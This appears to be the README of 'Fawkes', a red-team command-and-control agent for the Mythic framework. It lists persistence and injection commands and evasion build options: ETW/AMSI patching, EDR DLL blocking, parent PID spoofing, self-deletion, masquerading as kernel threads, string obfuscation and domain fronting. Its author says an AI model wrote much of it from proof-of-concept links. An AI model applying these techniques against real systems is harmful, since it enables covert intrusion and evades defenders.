whoami | `whoami` | Display current user identity and security context. On Windows: username, SID, token type, integrity level, group memberships, privileges. On Linux/macOS: user, UID, GID, supplementary groups.
wmi | `wmi -action <execute\|query\|process-list\|os-info> [-target <host>] [-command <cmd>] [-query <wql>]` | **(Windows only)** Execute WMI queries and process creation via COM API.
wmi-persist | `wmi-persist -action <install\|remove\|list> -name <id> -trigger <logon\|startup\|interval\|process> -command <exe>` | **(Windows only)** WMI Event Subscription persistence via COM API. Fileless, survives reboots. MITRE T1546.003.
write-file | `write-file -path <file> -content <text> [-base64 true] [-append true] [-mkdir true]` | Write text or base64-decoded content to a file. Create, overwrite, or append without spawning subprocesses. Cross-platform (T1105).
write-memory | `write-memory <dll_name> <function_name> <start_index> <hex_bytes>` | **(Windows only)** Write bytes to a DLL function address.

## Injection Techniques

### PoolParty Injection

| Variant | Technique | Trigger | Go Shellcode |
|---------|-----------|---------|--------------|
| 1 | Worker Factory Start Routine Overwrite | New worker thread creation | No |
| 2 | TP_WORK Insertion | Task queue processing | Yes |
| 3 | TP_WAIT Insertion | Event signaling | Yes |
| 4 | TP_IO Insertion | File I/O completion | Yes |
| 5 | TP_ALPC Insertion | ALPC port messaging | Yes |
| 6 | TP_JOB Insertion | Job object assignment | Yes |
| 7 | TP_DIRECT Insertion | I/O completion port | Yes |
| 8 | TP_TIMER Insertion | Timer expiration | Yes |

### Opus Injection

| Variant | Technique | Target | Go Shellcode |
|---------|-----------|--------|--------------|
| 1 | Ctrl-C Handler Chain | Console processes only | No |
| 4 | PEB KernelCallbackTable | GUI processes only | Yes |

For detailed variant descriptions, see [Injection Technique Details](research/injection-techniques.md).

## Build Options

### Binary Inflation

Fawkes supports optional binary inflation at build time. This embeds a block of repeated bytes into the compiled agent, which can be used to increase file size or lower entropy scores.

Two build parameters control this:
- **inflate_bytes** - Hex bytes to embed (e.g. `0x90` or `0x41,0x42`)
- **inflate_count** - Number of times to repeat the byte pattern

The byte pattern is repeated `inflate_count` times, so the total added size is `length(byte_pattern) * inflate_count`.

**Quick reference for sizing:**

| inflate_count | Single byte (e.g. `0x90`) | Two bytes (e.g. `0x41,0x42`) |
|---------------|---------------------------|------------------------------|
| 1,000 | 1 KB | 2 KB |
| 10,000 | 10 KB | 20 KB |
| 100,000 | 100 KB | 200 KB |
| 1,000,000 | 1 MB | 2 MB |
| 3,000,000 | 3 MB | 6 MB |
| 10,000,000 | 10 MB | 20 MB |

When inflation is not configured, only 1 byte of overhead is added to the binary.

## Opsec Features

### Artifact Tracking

Fawkes automatically registers artifacts with Mythic for opsec-relevant commands. Artifacts appear in the Mythic UI under the **Artifacts** tab, giving operators a clear picture of all forensic indicators generated during an engagement.

Tracked artifact types:

| Type | Commands |
|------|----------|
| Process Create | run, powershell, spawn, argue |
| API Call | net-enum, net-loggedon, net-session, net-shares, net-user, service, wmi, schtask, procdump, hashdump, eventlog, ntdll-unhook, syscalls, firewall, dcom, vss (create/delete), psexec |
| Process Kill | kill |
| Process Inject | vanilla-injection, apc-injection, threadless-inject, poolparty-injection, opus-injection, module-stomping, thread-hijack |
| File Write | upload, cp, mv |
| File Create | mkdir |
| File Delete | rm |
| File Modify | timestomp |
| Registry Write | reg-write, reg-delete, persist (registry, com-hijack, screensaver methods), uac-bypass, defender (add/remove-exclusion) |
| Registry Save | reg-save |
| Logon | make-token |
| Token Steal | steal-token, getsystem |

Read-only commands (ls, ps, cat, env, etc.) do not generate artifacts.

### TLS Certificate Verification

Control how the agent validates HTTPS certificates when communicating with the C2 server. Configured at build time via the **tls_verify** parameter:

| Mode | Description |
|------|-------------|
| `none` | Skip all TLS verification (default, backward compatible) |
| `system-ca` | Validate certificates against the OS trust store |
| `pinned:<sha256>` | Pin to a specific certificate fingerprint (SHA-256 hex). Agent rejects connections if the server cert doesn't match. |

Certificate pinning prevents MITM interception of agent traffic even if an attacker controls a trusted CA.

### Environment Keying / Guardrails

Prevent the agent from executing on unauthorized systems. Configured at build time — the agent silently exits before making any network contact if checks fail. No logging, no artifacts, no C2 traffic.

| Parameter | Type | Description |
|-----------|------|-------------|
| `env_key_hostname` | Regex | Hostname must match (e.g., `WORKSTATION-\d+` or `.*\.contoso\.com`) |
| `env_key_domain` | Regex | Domain must match (e.g., `CONTOSO` or `.*\.local`) |
| `env_key_username` | Regex | Username must match (e.g., `admin.*` or `svc_.*`) |
| `env_key_process` | String | Process name that must be running (e.g., `outlook.exe`) |

All patterns are case-insensitive and anchored to match the full value. Multiple keys can be combined — all must pass. Invalid regex patterns fail closed (agent exits). Leave empty to skip a check.

### C2 String Obfuscation

Enable the **obfuscate_strings** build parameter to XOR-encode all C2 config strings (callback host, URIs, user agent, encryption key, UUID) at build time with a per-build random 32-byte key. Prevents trivial IOC extraction via `strings` on the binary. Decoded at runtime. Cross-platform.

### BlockDLLs for Child Processes

Enable the **block_dlls** build parameter to apply `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` to all child processes spawned by the agent (run, powershell commands). Prevents EDR from injecting monitoring DLLs into spawned processes. Uses `STARTUPINFOEX` with `UpdateProcThreadAttribute`. Windows only.

### Parent PID Spoofing for Subprocesses

Set `config -action set -key default_ppid -value <PID>` at runtime to make all child processes (`run`, `powershell`) appear as children of a legitimate process (e.g., `explorer.exe`). Defeats parent-child process relationship detection by EDR. Combines with BlockDLLs when both are active. Uses `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)`. Disable with `config -action set -key default_ppid -value 0`. Windows only (T1134.004).

### Auto-Patch ETW/AMSI

Enable the **auto_patch** build parameter to automatically patch `EtwEventWrite` and `AmsiScanBuffer` at agent startup. This prevents ETW-based detection and AMSI scanning before any agent activity occurs — no manual command required. Windows only (no-op on Linux/macOS).

### Self-Deletion

Enable automatic binary deletion at startup via the **self_delete** build parameter. Once the agent starts running, it removes its own file from disk — eliminating the primary forensic artifact.

- **Linux/macOS**: Uses `os.Remove()` — the running process continues via the in-memory inode mapping. The file disappears from disk immediately.
- **Windows**: Uses the NTFS stream rename technique — renames the default `:$DATA` stream then deletes the file entry. No child process spawned.

The binary is deleted after environment key checks pass but before network activity begins.

### Process Masquerading (Linux)

Set the **masquerade_name** build parameter to change the agent's process name on Linux. Uses `prctl(PR_SET_NAME)` to modify `/proc/self/comm`, which is displayed by `ps`, `top`, and `htop`. Max 15 characters.

Useful names: `[kworker/0:1]`, `[migration/0]`, `sshd`, `apache2`, `[rcu_preempt]`

Combined with self-delete, the agent appears as a legitimate kernel thread or service with no file on disk.

### Custom HTTP Headers

All headers defined in the Mythic HTTP C2 profile configuration are applied to every request. Beyond `User-Agent` (always supported), operators can add headers like `Accept-Language`, `Referer`, `Cookie`, or `X-Forwarded-For` to blend C2 traffic with legitimate web traffic patterns.

### Domain Fronting

Set the **host_header** build parameter to override the HTTP `Host` header. This enables domain fronting: route traffic through a CDN (e.g., CloudFront, Azure CDN) while the `Host` header targets your actual C2 domain. To network defenders, the traffic appears to go to the CDN's IP address.

### Proxy Support

Set the **proxy_url** build parameter to route agent traffic through an HTTP or SOCKS proxy. Useful for operating in corporate networks with mandatory proxy servers.

Examples: `http://proxy.corp.local:8080`, `socks5://127.0.0.1:1080`

## Supported C2 Profiles

### [HTTP Profile](https://github.com/MythicC2Profiles/http)

The HTTP profile calls back to the Mythic server over the basic, non-dynamic profile. This is the default egress profile — the agent polls Mythic for tasking over HTTP/HTTPS.

### TCP P2P Profile

The TCP profile enables peer-to-peer (P2P) agent linking for internal pivoting. A TCP child agent listens on a port and waits for a parent agent to connect via the `link` command. All tasking and responses are routed through the parent's egress channel (HTTP), so the child never contacts Mythic directly.

**Architecture:**

```
Mythic Server ←──HTTP──→ Egress Agent (HTTP profile)
                              │
                              ├──TCP──→ Child Agent A (TCP profile, port 7777)
                              └──TCP──→ Child Agent B (TCP profile, port 8888)
```

**Build parameters:**

| Parameter | Description | Default |
|-----------|-------------|---------|
| `tcp_bind_address` | Address and port for the child to listen on (e.g., `0.0.0.0:7777`) | _(empty = HTTP mode)_ |

When `tcp_bind_address` is set, the agent starts in TCP listener mode instead of HTTP egress mode. The TCP C2 profile parameters (port, AESPSK, killdate) configure the listener.

**Usage workflow:**

1. Build a **child agent** with the TCP C2 profile and `tcp_bind_address` set (e.g., `0.0.0.0:7777`)
2. Deploy the child to an internal host (no internet access required)
3. From an **egress agent** (HTTP profile), run: `link -host <child_ip> -port 7777`
4. Mythic creates a new callback for the child — all tasking flows through the egress agent
5. To disconnect: `unlink -connection_id <uuid>`

**Encryption:** AES-256-CBC with HMAC-SHA256 (same as HTTP profile). Wire protocol uses 4-byte length-prefixed framing.

**Relink support:** If a parent disconnects (e.g., via `unlink` or parent agent dies), the child agent caches its checkin data and waits for a new parent connection. When a new egress agent runs `link`, the child automatically re-registers with Mythic as a new callback. No manual intervention needed.

**Multiple children:** An egress agent can link to multiple TCP children simultaneously. Each child operates independently with its own callback.

## Thanks
Everything I know about Mythic Agents came from Mythic Docs or stealing code and ideas from the [Merlin](https://github.com/MythicAgents/merlin) and [Freyja](https://github.com/MythicAgents/freyja) agents.

After that, it's been exclusively feeding Claude PoC links and asking for cool stuff. Crazy right?

## Techniques and References
- **Threadless Injection** - [CCob's ThreadlessInject](https://github.com/CCob/ThreadlessInject) (original C# implementation) and [dreamkinn's go-ThreadlessInject](https://github.com/dreamkinn/go-ThreadlessInject) (Go port)
- **sRDI (Shellcode Reflective DLL Injection)** - [Merlin's Go-based sRDI implementation](https://github.com/MythicAgents/merlin), originally based on [Nick Landers' (monoxgas) sRDI](https://github.com/monoxgas/sRDI)
- **PoolParty Injection** - [SafeBreach Labs PoolParty research](https://github.com/SafeBreach-Labs/PoolParty) (original C++ PoC) - [Variant details](research/injection-techniques.md#poolparty-injection)
- **Opus Injection** - Callback-based injection techniques - [Variant details](research/injection-techniques.md#opus-injection)
- Phoenix icon from [OpenClipart](https://openclipart.org/detail/229408/colorful-phoenix-line-art-12)
